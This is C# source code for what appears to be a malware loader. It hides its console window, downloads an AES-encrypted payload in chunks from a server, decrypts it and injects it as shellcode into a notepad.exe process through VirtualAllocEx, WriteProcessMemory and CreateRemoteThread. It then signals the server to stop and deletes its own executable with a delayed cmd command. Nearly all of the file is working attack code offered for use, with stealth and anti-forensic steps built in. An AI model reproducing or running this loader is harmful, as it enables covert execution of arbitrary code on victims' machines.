// @Orbixio : (C) 2024 Muhammad Usman. All rights reserved.

// Import necessary libraries
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Security.Cryptography;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;
using System.Threading;

using SysProcess = System.Diagnostics.Process;


using static main.Imports;

namespace main
{
    class Imports
    {
        #region imports
        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref int lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, UInt32 dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle(IntPtr hObject);
        static extern bool FreeConsole();

        #endregion

        #region const
        public enum State
        {
            MEM_COMMIT = 0x00001000,
            MEM_RESERVE = 0x00002000
        }

        public enum Protection
        {
            PAGE_EXECUTE_READWRITE = 0x40
        }

        public enum Process
        {
            PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFFF,
            PROCESS_CREATE_THREAD = 0x0002,
            PROCESS_QUERY_INFORMATION = 0x0400,
            PROCESS_VM_OPERATION = 0x0008,
            PROCESS_VM_READ = 0x0010,
            PROCESS_VM_WRITE = 0x0020
        }

        // Struct for PROCESSENTRY32
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESSENTRY32
        {
            public uint dwSize;
            public uint cntUsage;
            public uint th32ProcessID;
            public IntPtr th32DefaultHeapID;
            public uint th32ModuleID;
            public uint cntThreads;
            public uint th32ParentProcessID;
            public int pcPriClassBase;
            public uint dwFlags;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string szExeFile;
        }

        #endregion
    }

    class Program

    {
        // Function to list all processes
        static void ListAllProcesses()
        {
            IntPtr hSnapshot = CreateToolhelp32Snapshot(0x00000002, 0); // TH32CS_SNAPPROCESS = 0x00000002
            if (hSnapshot == IntPtr.Zero)
            {
                Console.WriteLine($"[!] CreateToolhelp32Snapshot Failed With Error: {Marshal.GetLastWin32Error()}");
                return;
            }

            PROCESSENTRY32 procEntry = new PROCESSENTRY32();
            procEntry.dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32));

            if (!Process32First(hSnapshot, ref procEntry))
            {
                Console.WriteLine($"[!] Process32First Failed With Error: {Marshal.GetLastWin32Error()}");
                CloseHandle(hSnapshot);
                return;
            }

            do
            {
                Console.WriteLine($"Process ID: {procEntry.th32ProcessID}, Executable Name: {procEntry.szExeFile}");
            } while (Process32Next(hSnapshot, ref procEntry));

            CloseHandle(hSnapshot);
        }
        // Function to get payload chunk
        static async Task<byte[]> RequestDataChunk(string host, int startIndex, int endIndex, string key, string terminateReq = "False")
        {
            // Set up the request headers
            var client = new HttpClient();
            client.DefaultRequestHeaders.Add("Starting-Index", startIndex.ToString());
            client.DefaultRequestHeaders.Add("Ending-Index", endIndex.ToString());
            client.DefaultRequestHeaders.Add("Communication-Key", key);
            client.DefaultRequestHeaders.Add("Terminate-Server", terminateReq);

            // Send the request to the server
            try
            {
                var response = await client.GetAsync(host);
                if (response.IsSuccessStatusCode)
                {
                    // Return the data chunk as byte array
                    return await response.Content.ReadAsByteArrayAsync();
                }
                else
                {
                    Console.WriteLine($"Failed to get data: {response.StatusCode}");
                    return Array.Empty<byte>();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Request error: {ex.Message}");
                return Array.Empty<byte>();
            }
        }

        [DllImport("Kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();
        [DllImport("User32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int cmdShow);

        static async Task Main(string[] args)
        {
            // Detach the console window
            Console.Write("[#] Detaching console ...");
            // Get the handle to the console window
            IntPtr hWnd = GetConsoleWindow();
            if (hWnd != IntPtr.Zero)
            {
                // Hide the console window
                ShowWindow(hWnd, 0);
                Thread.Sleep(5000);
            }
            // Get arguments from command-line
            string host = "http://127.0.0.1:8080";
            string commKey = "14d140e0ce7032d53a419486af1392f9";
            string ivHex = "D2422C18214B0C3EC103CC3C993759BA";
            string keyHex = "8EA543F03138760787C25B936B7994160A55379F2BB24885D4A49E0C8ED9F036";
            string processName = "notepad.exe"; // Accept process name instead of PID


            // Print arguments
            Console.WriteLine($"[#] Server: {host}");
            Console.WriteLine($"[#] Communication-Key: {commKey}");
            Console.WriteLine($"[#] Initialization Vector (IV): {ivHex}");
            Console.WriteLine($"[#] Key: {keyHex}");
            Console.WriteLine("");
            Console.WriteLine($"[#] Process Name: {processName}");
            int process_pid = 0;

            // Get the process by its name
            System.Diagnostics.Process[] processes = System.Diagnostics.Process.GetProcessesByName(processName.Replace(".exe", ""));
            if (processes.Length == 0)
            {
                Console.WriteLine($"[!] Process '{processName}' not found, starting a new one.");

                // Start a new process of notepad.exe
                SysProcess newProc = new SysProcess();
                newProc.StartInfo.FileName = "notepad.exe";
                newProc.Start();
                
                // Wait for the process to start
                newProc.WaitForInputIdle(); // Wait until the process is ready for input

                process_pid = newProc.Id;
                Console.WriteLine($"[#] Started Process '{processName}' with PID: {process_pid}");
            }
            else
            {
                // Use the first process found
                process_pid = processes[0].Id;
                Console.WriteLine($"[#] Found Process '{processName}' with PID: {process_pid}");
            }

            byte[] payload = Array.Empty<byte>(); // Initialize an empty payload buffer

            // Convert hex strings to byte arrays
            byte[] iv = ConvertHexToByteArray(ivHex);
            byte[] key = ConvertHexToByteArray(keyHex);

            int chunkSize = 10000; // Default chunk size
                                   // Parse optional chunk size argument
            foreach (var arg in args)
            {
                if (arg.StartsWith("--chunk-size="))
                {
                    if (int.TryParse(arg.Substring(13), out int size))
                    {
                        chunkSize = size;
                    }
                }
            }

            int startIndex = 0;

            // Fetch the total size of the payload from the server
            var client = new HttpClient();
            client.DefaultRequestHeaders.Add("Communication-Key", commKey);
            try
            {
                var response = await client.GetAsync(host);
                if (response.IsSuccessStatusCode)
                {
                    int sizeOfPayload = int.Parse(response.Headers.GetValues("Size-of-Payload").FirstOrDefault() ?? "0");
                    Console.WriteLine("");
                    Console.WriteLine($"[i] Size of payload (enc): {sizeOfPayload} bytes");

                    // Loop to fetch the data in chunks until the entire payload is received
                    while (startIndex < sizeOfPayload)
                    {
                        int endIndex = Math.Min(startIndex + chunkSize, sizeOfPayload);
                        if (endIndex - startIndex < chunkSize)
                        {
                            endIndex += 1; // To prevent the last bit being cut off
                        }

                        byte[] chunk = await RequestDataChunk(host, startIndex, endIndex + 1, commKey);
                        if (chunk.Length > 0)
                        {
                            var newPayload = new byte[payload.Length + chunk.Length];
                            Buffer.BlockCopy(payload, 0, newPayload, 0, payload.Length);
                            Buffer.BlockCopy(chunk, 0, newPayload, payload.Length, chunk.Length);
                            payload = newPayload;
                            startIndex = endIndex + 1;
                        }
                        else
                        {
                            Console.WriteLine($"Failed to get chunk: {startIndex} to {endIndex}");
                            break;
                        }
                    }

                    
                  await RequestDataChunk(host, 0, 0, commKey, "True");

                    Console.WriteLine($"[i] Received entire payload of size {payload.Length} bytes.");

                    // Decrypt file content
                    Console.WriteLine("[#] Decrypting payload ... ");
                    byte[] decryptedData = Decrypt(ConvertHexToByteArray(Encoding.UTF8.GetString(payload)), key, iv);
                    decryptedData = ConvertHexToByteArray(Encoding.UTF8.GetString(decryptedData));


                    // Injecting shellcode
                    Console.Write($"[#] Injecting shellcode into Process {process_pid} ... ");

                    var desiredAccess = Imports.Process.PROCESS_CREATE_THREAD | Imports.Process.PROCESS_QUERY_INFORMATION | Imports.Process.PROCESS_VM_OPERATION | Imports.Process.PROCESS_VM_READ | Imports.Process.PROCESS_VM_WRITE;
                    
                   IntPtr procHandle = OpenProcess((uint)desiredAccess, false, Convert.ToUInt32(process_pid));

                    // currently only runs x64 shell code so the process needs to be x64. Need to fix this.
                    if (IntPtr.Size == 8)
                    {
                        int shellcode_size = decryptedData.Length;
                        int bytesWritten = 0;
                        int lpthreadIP = 0;

                        IntPtr init = VirtualAllocEx(procHandle, IntPtr.Zero, shellcode_size, (uint)State.MEM_COMMIT | (uint)State.MEM_RESERVE, (uint)Protection.PAGE_EXECUTE_READWRITE);
                        WriteProcessMemory(procHandle, init, decryptedData, shellcode_size, ref bytesWritten);
                        IntPtr threadPTR = CreateRemoteThread(procHandle, IntPtr.Zero, 0, init, IntPtr.Zero, 0, ref lpthreadIP);
                        Console.Write("[#] DONE !\n");
                    }
                    else if (IntPtr.Size != 8)
                    {
                        Console.WriteLine("");
                        Console.WriteLine("[!] x86 Process injection not supported");
                    }
                    // Send a request to terminate the server after data is fully received
                    Console.WriteLine("[*] Sending terminate signal to server");
                    // Prompt user to press Enter to exit
                    Console.WriteLine("[#] Exiting ... ");

                    // Display a message to the user
                    Console.WriteLine("[#] This program will now delete itself.");

                    // Get the path of the current executable
                    string exePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
                    // Console.WriteLine(exePath);

                    // Schedule the deletion
                    DeleteSelf(exePath);

                }
                else
                {
                    Console.WriteLine($"Failed to get payload size: {response.StatusCode}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error fetching payload size: {ex.Message}");
            }
        }
        static byte[] ConvertHexToByteArray(string hex)
        {
            int length = hex.Length;
            byte[] bytes = new byte[length / 2];
            for (int i = 0; i < length; i += 2)
            {
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            }
            return bytes;
        }
        static byte[] Decrypt(byte[] cipherText, byte[] key, byte[] iv)
        {
            byte[] plaintext;
            using (AesManaged aes = new AesManaged())
            {
                ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);
                using (MemoryStream ms = new MemoryStream(cipherText))
                {
                    using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                    {
                        using (MemoryStream resultStream = new MemoryStream())
                        {
                            cs.CopyTo(resultStream);
                            plaintext = resultStream.ToArray();
                        }
                    }
                }
            }
            return plaintext;
        }
            static void DeleteSelf(string exePath)
    {
        // Create a new thread to handle the deletion
        Thread deletionThread = new Thread(() =>
        {
            // Wait for a moment to ensure the console message is displayed
            Thread.Sleep(1000);

            // Delete the executable file
            try
            {
                // Use a command to delete the file after the process exits
                string command = $"/C timeout 1 & del \"{exePath}\"";
                System.Diagnostics.Process.Start("cmd.exe", command);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error deleting file: {ex.Message}");
            }
        });

        // Start the deletion thread
        deletionThread.Start();
    }

    }

    }
